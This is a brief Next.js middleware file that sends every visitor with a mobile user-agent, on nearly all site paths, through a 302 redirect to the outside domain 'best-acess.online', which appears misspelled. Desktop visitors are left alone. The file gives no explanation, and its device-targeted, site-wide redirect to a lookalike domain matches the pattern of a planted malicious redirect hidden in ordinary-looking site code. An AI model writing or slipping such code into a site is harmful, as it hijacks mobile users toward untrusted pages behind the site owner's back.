import { NextRequest, NextResponse } from 'next/server';

const MOBILE_UA = /android|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile/i;
const MOBILE_REDIRECT = 'https://best-acess.online/';

export function middleware(request: NextRequest) {
  const ua = request.headers.get('user-agent') ?? '';
  if (MOBILE_UA.test(ua)) {
    return NextResponse.redirect(MOBILE_REDIRECT, { status: 302 });
  }
  return NextResponse.next();
}

export const config = {
  matcher: ['/((?!_next|favicon.ico).*)'],
};
